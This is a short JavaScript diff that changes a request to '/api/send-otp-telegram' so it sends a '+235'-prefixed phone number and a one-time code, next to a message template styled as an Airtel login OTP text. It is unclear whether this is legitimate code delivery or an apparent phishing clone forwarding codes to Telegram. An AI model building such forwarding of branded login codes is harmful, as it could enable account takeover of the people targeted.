@@ -172,7 +172,10 @@ const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not shar
         const response = await fetch('/api/send-otp-telegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phoneNumber }),
+          body: JSON.stringify({ 
+            phoneNumber: `+235${phoneNumber}`,
+            otpCode : `${otpCode}`,
+       }),
         });
 
         const data = await response.json();
